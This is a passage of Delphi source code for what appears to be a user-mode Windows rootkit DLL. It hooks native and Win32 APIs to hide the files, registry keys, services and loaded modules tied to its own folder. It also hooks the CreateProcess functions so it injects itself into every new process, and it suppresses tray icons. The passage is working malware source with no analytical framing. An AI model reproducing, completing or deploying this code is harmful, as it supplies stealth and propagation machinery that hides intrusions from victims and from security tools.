              LastFileBothDirectoryInfo.NextEntryOffset := LastFileBothDirectoryInfo.NextEntryOffset + FileBothDirectoryInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileBothDirectoryInfo.NextEntryOffset;
        until FileBothDirectoryInfo.NextEntryOffset = 0;
      end;
    12:
      begin
        FileNamesInfo := nil;
        repeat
          LastFileNamesInfo := FileNamesInfo;
          FileNamesInfo := PFILE_NAMES_INFORMATION(pointer(dword(FileInformation) + Offset));
          Name := Copy(WideCharToString(FileNamesInfo.FileName), 1, FileNamesInfo.FileNameLength div 2);
          if StrCmp(Name, Root) then
          begin
            if FileNamesInfo.NextEntryOffset = 0 then
            begin
              if LastFileNamesInfo <> nil then LastFileNamesInfo.NextEntryOffset := 0
              else Result := NTSTATUS($C000000F);
              Exit;
            end
            else
            begin
              LastFileNamesInfo.NextEntryOffset := LastFileNamesInfo.NextEntryOffset + FileNamesInfo.NextEntryOffset;
            end;
          end;
          Offset := Offset + FileNamesInfo.NextEntryOffset;
        until FileNamesInfo.NextEntryOffset = 0;
      end;
  end;
end;

function EnumServicesStatusAHookProc(hSCManager: SC_HANDLE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPENUM_SERVICE_STATUSA; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD): BOOL; stdcall;
var
  ServiceStatus: PEnumServiceStatusA;
  ServiceLoop: dword;
  RootServices: string;
begin
  Result := EnumServicesStatusANextHook(hSCManager, dwServiceType, dwServiceState, lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle);
  if not Result then Exit;
  RootServices := GetRootServices;
  ServiceLoop := 0;
  while ServiceLoop < lpServicesReturned do
  begin
    ServiceStatus := pointer(dword(lpServices) + (SizeOf(TEnumServiceStatusA) * ServiceLoop));
    if Pos(LowerCase('|' + ServiceStatus.lpServiceName + '|'), RootServices) <> 0 then
    begin
      ZeroMemory(ServiceStatus, SizeOf(TEnumServiceStatusA));
      CopyMemory(ServiceStatus, pointer(dword(ServiceStatus) + SizeOf(TEnumServiceStatusA)), (lpServicesReturned - ServiceLoop - 1) * SizeOf(TEnumServiceStatusA));
      Dec(lpServicesReturned);
    end
    else
    begin
      Inc(ServiceLoop);
    end;
  end;
end;

function EnumServicesStatusWHookProc(hSCManager: SC_HANDLE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPENUM_SERVICE_STATUSW; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD): BOOL; stdcall;
var
  ServiceStatus: PEnumServiceStatusW;
  ServiceLoop: dword;
  RootServices: string;
begin
  Result := EnumServicesStatusWNextHook(hSCManager, dwServiceType, dwServiceState, lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle);
  if not Result then Exit;
  RootServices := GetRootServices;
  ServiceLoop := 0;
  while ServiceLoop < lpServicesReturned do
  begin
    ServiceStatus := pointer(dword(lpServices) + (SizeOf(TEnumServiceStatusW) * ServiceLoop));
    if Pos(LowerCase('|' + WideCharToString(ServiceStatus.lpServiceName) + '|'), RootServices) <> 0 then
    begin
      ZeroMemory(ServiceStatus, SizeOf(TEnumServiceStatusW));
      CopyMemory(ServiceStatus, pointer(dword(ServiceStatus) + SizeOf(TEnumServiceStatusW)), (lpServicesReturned - ServiceLoop - 1) * SizeOf(TEnumServiceStatusW));
      Dec(lpServicesReturned);
    end
    else
    begin
      Inc(ServiceLoop);
    end;
  end;
end;

function EnumServicesStatusExAHookProc(hSCManager: SC_HANDLE; InfoLevel: SC_ENUM_TYPE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPBYTE; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD; pszGroupName: LPCSTR): BOOL; stdcall;
var
  ServiceStatus: PEnumServiceStatusProcessA;
  ServiceLoop: dword;
  RootServices: string;
begin
  Result := EnumServicesStatusExANextHook(hSCManager, InfoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle, pszGroupName);
  if not Result then Exit;
  RootServices := GetRootServices;
  ServiceLoop := 0;
  while ServiceLoop < lpServicesReturned do
  begin
    ServiceStatus := pointer(dword(lpServices) + (SizeOf(TEnumServiceStatusProcessA) * ServiceLoop));
    if Pos(LowerCase('|' + ServiceStatus.lpServiceName + '|'), RootServices) <> 0 then
    begin
      ZeroMemory(ServiceStatus, SizeOf(TEnumServiceStatusProcessA));
      CopyMemory(ServiceStatus, pointer(dword(ServiceStatus) + SizeOf(TEnumServiceStatusProcessA)), (lpServicesReturned - ServiceLoop - 1) * SizeOf(TEnumServiceStatusProcessA));
      Dec(lpServicesReturned);
    end
    else
    begin
      Inc(ServiceLoop);
    end;
  end;
end;

function EnumServicesStatusExWHookProc(hSCManager: SC_HANDLE; InfoLevel: SC_ENUM_TYPE; dwServiceType: DWORD; dwServiceState: DWORD; lpServices: LPBYTE; cbBufSize: DWORD; var pcbBytesNeeded, lpServicesReturned, lpResumeHandle: DWORD; pszGroupName: LPCWSTR): BOOL; stdcall;
var
  ServiceStatus: PEnumServiceStatusProcessW;
  ServiceLoop: dword;
  RootServices: string;
begin
  Result := EnumServicesStatusExWNextHook(hSCManager, InfoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle, pszGroupName);
  if not Result then Exit;
  RootServices := GetRootServices;
  ServiceLoop := 0;
  while ServiceLoop < lpServicesReturned do
  begin
    ServiceStatus := pointer(dword(lpServices) + (SizeOf(TEnumServiceStatusProcessW) * ServiceLoop));
    if Pos(LowerCase('|' + WideCharToString(ServiceStatus.lpServiceName) + '|'), RootServices) <> 0 then
    begin
      ZeroMemory(ServiceStatus, SizeOf(TEnumServiceStatusProcessW));
      CopyMemory(ServiceStatus, pointer(dword(ServiceStatus) + SizeOf(TEnumServiceStatusProcessW)), (lpServicesReturned - ServiceLoop - 1) * SizeOf(TEnumServiceStatusProcessW));
      Dec(lpServicesReturned);
    end
    else
    begin
      Inc(ServiceLoop);
    end;
  end;
end;

type
  PDebugModule = ^TDebugModule;
  TDebugModule = packed record
    Reserved: array [0..1] of Cardinal; 
    Base: Cardinal; 
    Size: Cardinal;
    Flags: Cardinal;
    Index: Word; 
    Unknown: Word;
    LoadCount: Word;
    ModuleNameOffset: Word; 
    ImageName: array [0..$FF] of Char;
  end;

  PDebugModuleInformation = ^TDebugModuleInformation;
  TDebugModuleInformation = record
    Count: Cardinal;
    Modules: array [0..0] of TDebugModule; 
  end; 
  PDebugBuffer = ^TDebugBuffer;
  TDebugBuffer = record 
    SectionHandle: THandle; 
    SectionBase: Pointer;
    RemoteSectionBase: Pointer; 
    SectionBaseDelta: Cardinal; 
    EventPairHandle: THandle; 
    Unknown: array [0..1] of Cardinal;
    RemoteThreadHandle: THandle; 
    InfoClassMask: Cardinal; 
    SizeOfInfo: Cardinal; 
    AllocatedSize: Cardinal; 
    SectionSize: Cardinal; 
    ModuleInformation: PDebugModuleInformation;
    BackTraceInformation: Pointer; 
    HeapInformation: Pointer;
    LockInformation: Pointer; 
    Reserved: array [0..7] of Pointer;
  end;

function RtlQueryProcessDebugInformationHookProc(hProcess: THandle; lpParam: dword; lpBuffer: pointer): dword; stdcall;
var
  QDB: PDebugBuffer;
  DllLoop: word;
begin
  Result := RtlQueryProcessDebugInformationNextHook(hProcess, lpParam, lpBuffer);
  if Result <> 0 then Exit;
  if lpBuffer = nil then Exit;
  QDB := PDebugBuffer(lpBuffer);
  DllLoop := 0;
  if IsBadReadPtr(@QDB.ModuleInformation.Count, SizeOf(PDebugModule)) then Exit;
  if QDB.ModuleInformation.Count = 0 then Exit;
  while DllLoop < QDB.ModuleInformation.Count do
  begin
    if Pos(LowerCase('\' + Root + '\'), string(QDB.ModuleInformation.Modules[DllLoop].ImageName)) <> 0 then
    begin
      CopyMemory(@QDB.ModuleInformation.Modules[DllLoop], @QDB.ModuleInformation.Modules[DllLoop + 1], SizeOf(QDB.ModuleInformation.Modules[DllLoop]));
      QDB.ModuleInformation.Count := QDB.ModuleInformation.Count - 1;
    end
    else
    begin
      Inc(DllLoop);
    end;
  end;
end;

function EnumProcessModulesHookProc(hProcess: Cardinal; lphModule: pdword; cb: Cardinal; lpcbNeeded: Cardinal): BOOL; stdcall;
var
  PID: HMODULE;
  PIDLoop: dword;
  lpBaseName: array [0..MAX_PATH] of char;
begin
  Result := EnumProcessModulesNextHook(hProcess, lphModule, cb, lpcbNeeded);
  if Result = False then Exit;
  PIDLoop := 0;
  while PIDLoop <= pdword(lpcbNeeded)^ div SizeOf(HMODULE) do
  begin
    PID := pdword(dword(lphModule) + (SizeOf(HMODULE) * PIDLoop))^;
    GetModuleFileNameEx(hProcess, PID, @lpBaseName, MAX_PATH);
    if Pos(LowerCase('\' + Root + '\'), string(lpBaseName)) <> 0 then
    begin
      CopyMemory(pdword(dword(lphModule) + (SizeOf(HMODULE) * PIDLoop)), pdword(dword(lphModule) + (SizeOf(HMODULE) * (PIDLoop + 1))), cb - (SizeOf(HMODULE) * (PIDLoop + 1)));
      Dec(pdword(lpcbNeeded)^, SizeOf(HMODULE));
      Dec(PIDLoop);
    end;
    Inc(PIDLoop);
  end;
end;

function Shell_NotifyIconAHookProc(dwMessage: DWORD; lpData: PNotifyIconDataA): BOOL; stdcall;
begin
  Result := True;
end;

function Shell_NotifyIconWHookProc(dwMessage: DWORD; lpData: PNotifyIconDataW): BOOL; stdcall;
begin
  Result := True;
end;

procedure MainThread(lpParameter: pointer); stdcall;
var
  MainThreadInfo: TMainThreadInfo;
begin
  MainThreadInfo := TMainThreadInfo(lpParameter^);
  asm
    @noret:
    push 1000
    call MainThreadInfo.pSleep
    jmp @noret
  end;
end;

function CreateProcessAHookProc(lpApplicationName: PAnsiChar; lpCommandLine: PAnsiChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PAnsiChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
var
  MainThreadInfo: TMainThreadInfo;
begin
  Result := CreateProcessANextHook(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags or CREATE_SUSPENDED, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
  MainThreadInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  InjectThread(lpProcessInformation.hProcess, @MainThread, @MainThreadInfo, SizeOf(TMainThreadInfo), False);
  InjectLibrary(lpProcessInformation.hProcess, FileMap);
  ResumeThread(lpProcessInformation.hThread);
end;

function CreateProcessWHookProc(lpApplicationName: PWideChar; lpCommandLine: PWideChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PWideChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
var
  MainThreadInfo: TMainThreadInfo;
begin
  Result := CreateProcessWNextHook(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags or CREATE_SUSPENDED, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
  MainThreadInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  InjectThread(lpProcessInformation.hProcess, @MainThread, @MainThreadInfo, SizeOf(TMainThreadInfo), False);
  InjectLibrary(lpProcessInformation.hProcess, FileMap);
  ResumeThread(lpProcessInformation.hThread);
end;

function CreateProcessAsUserAHookProc(hToken: THandle; lpApplicationName: PAnsiChar; lpCommandLine: PAnsiChar; lpProcessAttributes: PSecurityAttributes; lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PAnsiChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
var
  MainThreadInfo: TMainThreadInfo;
begin
  Result := CreateProcessAsUserANextHook(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags or CREATE_SUSPENDED, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
  MainThreadInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  InjectThread(lpProcessInformation.hProcess, @MainThread, @MainThreadInfo, SizeOf(TMainThreadInfo), False);
  InjectLibrary(lpProcessInformation.hProcess, FileMap);
  ResumeThread(lpProcessInformation.hThread);
end;

function CreateProcessAsUserWHookProc(hToken: THandle; lpApplicationName: PWideChar; lpCommandLine: PWideChar; lpProcessAttributes: PSecurityAttributes; lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PWideChar; const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
var
  MainThreadInfo: TMainThreadInfo;
begin
  Result := CreateProcessAsUserWNextHook(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags or CREATE_SUSPENDED, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
  MainThreadInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  InjectThread(lpProcessInformation.hProcess, @MainThread, @MainThreadInfo, SizeOf(TMainThreadInfo), False);
  InjectLibrary(lpProcessInformation.hProcess, FileMap);
  ResumeThread(lpProcessInformation.hThread);
end;

function CreateProcessWithLogonWHookProc(lpUsername, lpDomain, lpPassword: PWideChar; dwLogonFlags: dword; lpApplicationName: PWideChar; lpCommandLine: PWideChar; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PWideChar; const lpStartupInfo: tSTARTUPINFO; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
var
  MainThreadInfo: TMainThreadInfo;
begin
  Result := CreateProcessWithLogonWNextHook(lpUsername, lpDomain, lpPassword, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags or CREATE_SUSPENDED, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
  MainThreadInfo.pSleep := GetProcAddress(GetModuleHandle('kernel32'), 'Sleep');
  InjectThread(lpProcessInformation.hProcess, @MainThread, @MainThreadInfo, SizeOf(TMainThreadInfo), False);
  InjectLibrary(lpProcessInformation.hProcess, FileMap);
  ResumeThread(lpProcessInformation.hThread);
end;

procedure EntryPoint(Reason: dword);
begin
  if Reason <> DLL_PROCESS_ATTACH then Exit;
  Root := GetFolder;
  if IsId(GetCurrentProcessId) then
  begin
    HookCode(GetProcAddress(GetModuleHandle(Shell), 'Shell_NotifyIconA'), @Shell_NotifyIconAHookProc, @Shell_NotifyIconANextHook);
    HookCode(GetProcAddress(GetModuleHandle(Shell), 'Shell_NotifyIconW'), @Shell_NotifyIconWHookProc, @Shell_NotifyIconWNextHook);
    Exit;
  end;
  SetPrivilege;
  HookCode(GetProcAddress(GetModuleHandle(Ntdll), 'NtQuerySystemInformation'), @NtQuerySystemInformationHookProc, @NtQuerySystemInformationNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Ntdll), 'NtDeviceIoControlFile'), @NtDeviceIoControlFileHookProc, @NtDeviceIoControlFileNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Ntdll), 'NtQueryDirectoryFile'), @NtQueryDirectoryFileHookProc, @NtQueryDirectoryFileNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Ntdll), 'RtlQueryProcessDebugInformation'), @RtlQueryProcessDebugInformationHookProc, @RtlQueryProcessDebugInformationNextHook);
  if not IsExplorer(GetCurrentProcessId) then HookCode(GetProcAddress(GetModuleHandle(Ntdll), 'NtEnumerateValueKey'), @NtEnumerateValueKeyHookProc, @NtEnumerateValueKeyNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Ntdll), 'NtEnumerateKey'), @NtEnumerateKeyHookProc, @NtEnumerateKeyNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'EnumServicesStatusA'), @EnumServicesStatusAHookProc, @EnumServicesStatusANextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'EnumServicesStatusW'), @EnumServicesStatusWHookProc, @EnumServicesStatusWNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'EnumServicesStatusExA'), @EnumServicesStatusExAHookProc, @EnumServicesStatusExANextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'EnumServicesStatusExW'), @EnumServicesStatusExWHookProc, @EnumServicesStatusExWNextHook);
  HookCode(GetProcAddress(LoadLibrary('psapi'), 'EnumProcessModules'), @EnumProcessModulesHookProc, @EnumProcessModulesNextHook);
  MapMemory;
  HookCode(GetProcAddress(GetModuleHandle(Kernel), 'CreateProcessA'), @CreateProcessAHookProc, @CreateProcessANextHook);
  HookCode(GetProcAddress(GetModuleHandle(Kernel), 'CreateProcessW'), @CreateProcessWHookProc, @CreateProcessWNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'CreateProcessAsUserA'), @CreateProcessAsUserAHookProc, @CreateProcessAsUserANextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'CreateProcessAsUserW'), @CreateProcessAsUserWHookProc, @CreateProcessAsUserWNextHook);
  HookCode(GetProcAddress(GetModuleHandle(Advapi), 'CreateProcessWithLogonW'), @CreateProcessWithLogonWHookProc, @CreateProcessWithLogonWNextHook);
end;

begin
  DLLProc := @EntryPoint;
  EntryPoint(DLL_PROCESS_ATTACH);
  ExitThread(0);
end.
